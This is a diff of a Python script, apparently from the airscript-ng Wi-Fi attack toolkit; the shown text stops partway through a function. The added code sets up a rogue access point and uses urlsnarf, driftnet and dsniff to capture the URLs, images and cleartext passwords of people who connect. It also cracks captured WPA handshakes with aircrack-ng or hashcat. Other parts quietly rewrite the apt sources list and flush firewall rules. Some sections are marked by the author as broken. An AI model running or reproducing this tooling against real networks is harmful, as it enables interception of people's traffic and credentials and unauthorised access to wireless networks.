@@ -1,35 +1,853 @@
 #!/usr/bin/python3
-def depandancies():
-    import os,time
-    print("[-]Updating system and installing some dependancies. Please hold!")
-    os.system("sudo apt-get update > log.txt && sudo apt-get install apt -y > log.txt && sudo apt install xterm -y > log.txt")
-    os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool -y")
-    time.sleep(2)
-def check_depends():
-    import os,time
-    array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool"]
-    for i in array[0:len(array)]:
-        x = os.system("dpkg -l %s | awk -F ' ' {'print $2'} | grep -i '%s' >> log.txt" %(i,i))
-        if x == 0:
-            pass
-        else:
-            depandancies()            
-def clearScreen():
+def reaverspecialdeps():
     import os
-    if input("[i]Press 'y' to perform cleanup! >>").lower().startswith("y"):
-        print("\n[info]Wait a few seconds, cleaning up...")
-        os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
+    if os.system("ls ~/.airscriptNG/options.txt 2>/dev/null >/dev/null") != 0 or os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
+        os.system("mkdir ~/.airscriptNG/ 2>/dev/null;touch ~/.airscriptNG/options.txt;echo '1' > ~/.airscriptNG/options.txt;apt purge reaver -y 2>/dev/null >/dev/null")
+        if os.system("ls backup-repos >/dev/null 2>/dev/null") != 0: 
+            os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
+        xvar = os.system("sudo cat /etc/apt/sources.list | grep 'deb http://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
+        if xvar != 0:
+            os.system("lolxvarchartmp=$(mktemp -d) && cd $lolxvarchartmp && sudo cp /etc/apt/sources.list . && sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG' >> sources.list && mv sources.list /etc/apt/sources.list && cd .. && rmdir $lolxvarchartmp && cd ~/ && apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6 2>/dev/null")
+        depandancies()
+        os.system("echo \"$(cat /etc/apt/sources.list | grep -v 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG')\" > /etc/apt/sources.list")
+    else:
+        check_depends()
+def mitm_fakeap_func():#FIX THIS
+    try:
+        import os, time
+        if os.system("ls -l /var/lib/dhcp/dhcpd.leases 2>/dev/null >/dev/null") != 0:
+            os.system("touch /var/lib/dhcp/dhcpd.leases")
+        global ch2
+        global ch3
+        global ch4
+        global counter
+        count = 0
+        ch2 = ""
+        ch3 = ""
+        ch4 = ""
         os.system("clear")
-        if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
-            os.system("rm log.txt")
+        print("""
+
+    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
+    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
+    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
+    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
+    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
+    
+    """)
+        print("Welcome to the MITM/FAKE-AP screen")
+        print("Please note that to host a fake AP and MITM internet traffic, you'll need two network interfaces")
+        print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
+        print("\n-----------------------------------------OPTIONS-----------------------------------------")
+        print("\n[REQUIRED]- Host-ap with airbase-ng (hostapd support comming soon!)")
+        print("[UNSELECTED]- Intercept HTTP links and URLs - Type [2]")
+        print("[UNSELECTED]- Intercept any images - Type [3]")
+        print("[UNSELECTED]- Intercept any unencrypted passwords (not currently working) - Type [4]")
+        print("\n-----------------------------------------OPTIONS-----------------------------------------")
+        def help1():
+            print("[SELECTED]- Intercept HTTP links and URLs")
+        def help2():
+            print("[SELECTED]- Intercept any images")
+        def help3():
+            print("[SELECTED]- Intercept any unencrypted passwords (not currently working) ")
+            print("\n-----------------------------------------OPTIONS-----------------------------------------")
+        def helpe1():
+            print("[UNSELECTED]- Intercept HTTP links and URLs - Type [2]")
+        def helpe2():
+            print("[UNSELECTED]- Intercept any images - Type [3]")
+        def helpe3():
+            print("[UNSELECTED]- Intercept any unencrypted passwords (not currently working) - Type [4]")
+            print("\n-----------------------------------------OPTIONS-----------------------------------------")
+        #help1()
+        #help2()
+        #help3()
+        def idkwhat():
+            os.system("clear")
+            print("""
+
+    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
+    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
+    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
+    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
+    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
+    
+            """)
+            print("Welcome to the MITM/FAKE-AP screen")
+            print("Please note that to host a fake AP and MITM internet traffic, you'll need two network interfaces")
+            print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
+            print("\n-----------------------------------------OPTIONS-----------------------------------------")
+            print("\n[REQUIRED]- Host-ap with airbase-ng (hostapd support comming soon!)")
+        while True:
+            if count < 2:
+                choc = input("\nPlease choose two options, by entering the number. ~# ")
+                if choc != "" and choc.isnumeric() == True and choc in ["2","3","4"]:
+                    if choc == "2":
+                        ch2 = "X"
+                        count += 1
+                    if choc == "3":
+                        ch3 = "X"
+                        count += 1
+                    if choc == "4":
+                        ch4 = "X"
+                        count += 1
+                    idkwhat()
+                    if ch2 != "":
+                        help1()
+                    if ch2 == "":
+                        helpe1()
+                    if ch3 != "":
+                        help2()
+                    if ch3 == "":
+                        helpe2()    
+                    if ch4 != "":
+                        help3()
+                    if ch4 == "":
+                        helpe3()
+                    continue
+                else:
+                    os.system("clear")
+                    idkwhat()
+                    if ch2 != "":
+                        help1()
+                    if ch2 == "":
+                        helpe1()
+                    if ch3 != "":
+                        help2()
+                    if ch3 == "":
+                        helpe2()    
+                    if ch4 != "":
+                        help3()
+                    if ch4 == "":
+                        helpe3()
+                    continue
+            else:
+                break
+        crucial = input("\n\nOptions correctly chosen [y/n]? ~# ")
+        if crucial.lower().startswith("y"):
+            os.system("clear")
+            print("\n")
+            os.system("ls /sys/class/net | grep ^wl")
+            print("\n")
+            global airbase
+            airbase = input("[+]Ok, Now which interface shall I host the AP on?  ~#  ")
+            airbase = str(airbase)
+            os.system("clear")
+            print("\n")
+            os.system("ls /sys/class/net | grep -v lo | grep -v '%s' " %(airbase))
+            print("\n")
+            global inetface
+            inetface = input("[+]Which interface is connected to the internet?  ~#  ")
+            inetface = str(inetface)
+            global ssid
+            ssid = input("[?]What shall I call the AP? (SSID)  ~#  ")
+            ssid = str(ssid)
+            global channelno
+            channelno = input("[?]What channel shall I use?  ~#  ")
+            channelno = str(channelno)
+            global subnet
+            subnet = input("[?]Use default subnet of '192.168.1.x' [y/n]?  ~#  ")
+            subnet = str(subnet)
+            global subnet2
+            global subnet3
+            subnet2 = "1"
+            subnet3 = "0"
+            if subnet.lower().startswith("n"):
+                subnet2 = input("[?]Please enter the third digit of the subnet  ~#  ")
+                subnet3 = input("[?]Please enter the fourth digit of the subnet  ~#  ")
+                subnet2 = str(subnet2)
+                subnet3 = str(subnet3)
+            else:
+                pass
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'default-lease-time 600;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'max-lease-time 7200;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep 'subnet 192.168.1.0 netmask 255.255.255.0{' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo 'subnet 192.168.1.0 netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option subnet-mask 255.255.255.0;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option broadcast-address 192.168.1.255;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '    option broadcast-address 192.168.1.255;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option domain-name-servers 8.8.8.8;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    option routers 192.168.1.1;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '    option routers 192.168.1.1;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '    range 192.168.1.2 192.168.1.100;' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '    range 192.168.1.2 192.168.1.100;' >> /etc/dhcp/dhcpd.conf")
+            #if os.system("sudo cat /etc/dhcp/dhcpd.conf | tail -n 9 | grep '}' >/dev/null 2>/dev/null") != 0:
+            #    os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
+            if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") != 0:
+                os.system("echo '#BY AIRSCRIPT-NG' >> /etc/dhcp/dhcpd.conf")
+                os.system("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
+                os.system("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
+                os.system("echo 'subnet 192.168.%s.%s netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
+                os.system("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
+                os.system("echo '    option broadcast-address 192.168.%s.255;' >> /etc/dhcp/dhcpd.conf" %(subnet2))
+                os.system("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
+                global routeloop
+                routeloop = int(subnet3)
+                routeloop = routeloop + 1
+                os.system("echo '    option routers 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
+                global subnet4 
+                global subnet5
+                global subnet6
+                subnet4 = int(subnet3)
+                subnet5 = subnet4 + 2
+                subnet6 = subnet4 + 100
+                subnet5 = str(subnet5)
+                subnet6 = str(subnet6)
+                os.system("echo '    range 192.168.%s.%s 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
+                os.system("echo '}' >> /etc/dhcp/dhcpd.conf")
+            os.system("clear")
+            print("""
+
+    ███████╗ █████╗ ██╗  ██╗███████╗     █████╗ ██████╗ 
+    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗
+    █████╗  ███████║█████╔╝ █████╗█████╗███████║██████╔╝
+    ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝╚════╝██╔══██║██╔═══╝ 
+    ██║     ██║  ██║██║  ██╗███████╗    ██║  ██║██║     
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     
+    
+            """)
+            print("\n-----------------------------------------OPTIONS-----------------------------------------")
+            print("\n[REQUIRED]- Host-ap with airbase-ng (hostapd support comming soon!)")
+            if ch2 != "":
+                help1()
+            if ch3 != "":
+                help2()    
+            if ch4 != "":
+                help3()
+            print("\n[INFO]- SSID: %s" %(ssid))
+            print("[INFO]- CHANNEL: %s" %(channelno))
+            print("[INFO]- AP INTERFACE: %s" %(airbase))
+            print("[INFO]- INTERNET INTERFACE: %s" %(inetface))
+            print("[INFO]- SUBNET: 192.168.%s.x" %(subnet2))
+            #Put details of AP, card, etc..
+            print("\n-----------------------------------------OPTIONS-----------------------------------------")
+            randchoice = input("\n\nStart AP [y/n]? ~# ")
+            #Finish this
+            if randchoice.lower().startswith("y"):
+                #START HERE
+                #c2 = urlsnarf 
+                #c3 = driftnet
+                #c4 = dsniff
+                #Common os.system stuff here
+                def c2c3():
+                    if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
+                        os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
+                        os.system("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
+                        os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,routeloop))
+                        os.system("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
+                        os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
+                        os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
+                c2c3()
+                if ch2 != "" and ch3 != "":
+                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelno,airbase))
+                if ch2 != "" and ch4 != "":
+                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
+                if ch3 != "" and ch4 != "":
+                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
+                #END HERE
+                import atexit
+                def exynos():
+                    import os
+                    if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
+                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
+                        os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
+                        os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
+                        os.system("iptables --flush")
+                        os.system("iptables --table nat --flush")
+                        os.system("iptables --delete-chain")
+                        os.system("iptables --table nat --delete-chain")
+                        os.system("service isc-dhcp-server stop")
+                        os.system("rm /var/run/dhcpd.pid 2>/dev/null")
+                        os.system("clear")
+                atexit.register(exynos)
+            elif randchoice.lower().startswith("n"):
+                title()
+        elif crucial.lower().startswith("n"):
+            title()
+        elif crucial != "y" or crucial != "n":
+            title()
+        #print("You can select any 3 for now (No.1 is required). Selected options will appear in the box -> |-[%s]-[%s]-[%s]-|" %(ch1,ch2,ch3))
+    #WILL HOST THE CODE TO CREATE FAKE AP, RETRACE STEPS AND CONDUCT TMUX IN XTERM WITH DIFFERENT POSITIONS.
+    #xterm -geometry 125x35+4320 -bg '#FFFFFF' -fg '#000000' THIS MAKES IT APPEAR TOP RIGHT
+    #xterm -geometry 125x35+4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM RIGHT
+    #xterm -geometry 125x35-4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM LEFT
+    #xterm -geometry 125x35-7640 -bg '#FFFFFF' -fg '#000000' TOP LEFT try 87x25
+    #ENCLOSE THIS IN A TRY/EXCEPT LOOP
+    #os.system("echo -n \" // Chipset: \"; echo $(airmon-ng | awk -F ' ' {'print $4,$5,$6,$7'} | grep -v Chipset) ")
+    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
+        import os
+        if os.system("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") == 0:
+            os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null")
+            os.system("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
+            os.system("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
+            os.system("iptables --flush")
+            os.system("iptables --table nat --flush")
+            os.system("iptables --delete-chain")
+            os.system("iptables --table nat --delete-chain")
+            os.system("service isc-dhcp-server stop")
+            os.system("rm /var/run/dhcpd.pid 2>/dev/null")
+            os.system("clear")
+            #os.system("tac /etc/dhcp/dhcpd.conf | sed '1,10 d' | tac >> /etc/dhcp/dhcpd.conf") REALLY REALLY BROKEN!
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '#BY AIRSCRIPT-NG')\" > /etc/dhcp/dhcpd.conf")
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'default-lease-time 600;')\" > /etc/dhcp/dhcpd.conf")
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'max-lease-time 7200;')\" > /etc/dhcp/dhcpd.conf")
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v 'subnet 192.168.%s.%s netmask 255.255.255.0{')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option subnet-mask 255.255.255.0;')\" > /etc/dhcp/dhcpd.conf")
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option broadcast-address 192.168.%s.255;')\" > /etc/dhcp/dhcpd.conf" %(subnet2))
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option domain-name-servers 8.8.8.8;')\" > /etc/dhcp/dhcpd.conf")
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    option routers 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,routeloop))
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '    range 192.168.%s.%s 192.168.%s.%s;')\" > /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
+            #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '}')\" > /etc/dhcp/dhcpd.conf")
+        else:
+            os.system("clear")
+        os._exit(1)
+def handshake_func():
+    #Start here
+    try:
+        import os
+        print("[-] Checking for dependancies")
+        check_depends()
+        while True:
+            os.system("clear")
+            print("""
+
+         ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
+        ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
+        ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
+        ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
+        ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
+         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
+
+        
+                    """)
+            print("\nType [1] - Crack the WPA-HANDSHAKE with CPU")
+            print("Type [2] - Crack the WPA-HANDSHAKE with GPU (Much faster)")
+            print("\n\nType [99] - Return to menu")
+            global cpugpu
+            cpugpu = input("\n|MENU|PRE-EXISTING_HANDSHAKE|(ENTER CHOICE) ~# ")
+            if cpugpu != "":
+                break
+        cpugpu = str(cpugpu)
+        if cpugpu == "1": #CPU CRACK SECTION
+            from tkinter.filedialog import askopenfilename, Tk as capture
+            capture().withdraw()
+            global cpucrack
+            somepath = input("\nPlease specify a .cap file. (press enter) ~# ")
+            cpucrack = askopenfilename()
+            cpucrack = str(cpucrack)
+            print("\n[CAP FILE]: %s" %(cpucrack))
+            input("\nPlease specify a Wordlist. (press enter) ~# ")
+            wordcrack = askopenfilename()
+            wordcrack = str(wordcrack)
+            os.system("aircrack-ng %s -w %s" %(cpucrack,wordcrack))
+            print("\n")
+            os._exit(1)
+        elif cpugpu == "2": #GPU CRACK SECTION
+            from tkinter import filedialog
+            from tkinter.filedialog import askopenfilename, Tk as captured
+            captured().withdraw()
+            global gpucrack
+            somepath = input("\nPlease specify a .cap file. Must not be cleaned with WPACLEAN or such. (press enter) ~# ")
+            gpucrack = askopenfilename()
+            gpucrack = str(gpucrack)
+            print("\n[CAP FILE]: %s" %(gpucrack))
+            while True:
+                hcatinstalled = input("\nHave you installed hashcat and the drivers using option [8] from the menu? [y/n] ~# ")
+                if hcatinstalled.lower().startswith("n"):
+                    hashcatdownloadfunc()
+                    driverdownloadfunc()
+                    os.system("clear")
+                    drifunc()
+                    break
+                if hcatinstalled.lower().startswith("y"):
+                    break
+                else:
+                    os.system("clear")
+                    continue
+            input("\nWhere is the hashcat directory? Not hashcat-utils! EG: click inside the hashcat-3.x-x folder and press ok. (press enter) ~# ")
+            global hcatpath
+            captured().withdraw()
+            hcatpath = filedialog.askdirectory()
+            hcatpath = str(hcatpath)
+            def hcatfunc():
+                global mainwordlist
+                mainwordlist = "N/A"
+                os.system("clear")
+                print("""
+
+     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
+    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
+    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
+    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
+    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
+     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
+        
+                    """)
+                print("\n[CAP FILE]: %s" %(gpucrack))
+                print("[HASHCAT PATH]: %s" %(hcatpath))
+                print("[WORDLIST]: %s" %(mainwordlist))
+                def hfinal():
+                    os.system("clear")
+                    print("""
+
+     ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
+    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
+    ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
+    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
+    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
+     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
+
+                        """)
+                    print("\n[CAP FILE]: %s" %(gpucrack))
+                    print("[HASHCAT PATH]: %s" %(hcatpath))
+                    print("[HASHCAT-UTILS PATH]: %s" %(hcatutilspath))
+                    print("[WORDLIST]: %s" %(mainwordlist))
+                    print("[ATTACK MODE]: %s" %(ackmode))
+                    print("[TEMPERATURE RETAIN]: %s" %(retaingputemp))
+                    print("[TEMPERATURE ABORT]: %s" %(maxgputemp))
+                if mainwordlist == "N/A":
+                    global ackmode
+                    global hcatutilspath
+                    global maxgputemp
+                    global retaingputemp
+                    print("\nWordlist not chosen yet. Your options are:")
+                    print("\nType [1] - Choose a wordlist/dictionary and start cracking.")
+                    print("Type [2] - Use keyspace brute-force, no wordlist needed")
+                    print("Type [3] - Use a built-in wordlists, from Skull-security")
+                    print("\n\nType [99] - Return to menu ")
+                    global critchoice
+                    critchoice = input("\nEnter choice ~# ")
+                    if critchoice == "1":
+                        ackmode = "Standard user-chosen wordlist"
+                        input("\nReady to choose a Wordlist?. (press enter) ~# ")
+                        mainwordlist = askopenfilename()
+                        mainwordlist = str(mainwordlist)
+                        input("Please locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
+                        hcatutilspath = filedialog.askdirectory()
+                        hcatutilspath = str(hcatutilspath)
+                        while True:
+                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
+                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
+                            retaingputemp = int(retaingputemp)
+                            maxgputemp = int(maxgputemp)
+                            if retaingputemp < 80 and maxgputemp < 85:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                break
+                            else:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                print("\nTemperature value inappropriate! Please input proper and safe values. [<85c for retain  and <90c for max]")
+                                continue
+                        hfinal()
+                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
+                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
+                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
+                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
+                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
+                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
+                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
+                            os._exit(1)
+                        else:
+                            title()
+                    elif critchoice == "2":
+                        ackmode = "Keyspace bruteforce"
+                        mainwordlist = str("Not applicable")
+                        input("\nPlease locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
+                        hcatutilspath = filedialog.askdirectory()
+                        hcatutilspath = str(hcatutilspath)
+                        #PROVIDE OPTIONS TO VIEW KEYSPACE TABLE HERE
+                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
+                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
+                        if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt >/dev/null 2>/dev/null") != 0:
+                            os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
+                        while True:
+                            os.system("clear")
+                            print("\nTo brute-force the keyspace, you need to enter a mask/charset.")
+                            print("\nType [1] - I understand what a hashcat mask/charset is and want to proceed.")
+                            print("Type [2] - What is a mask/charset? How do I enter one? View documentation.")
+                            readchoices = input("\nEnter choice ~# ")
+                            if readchoices == "1":
+                                break
+                            if readchoices == "2":
+                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
+                                continue
+                        while True:
+                            os.system("clear")
+                            print("""
+    - [ Built-in Charsets ] -
+
+      ? | Charset
+     ===+=========
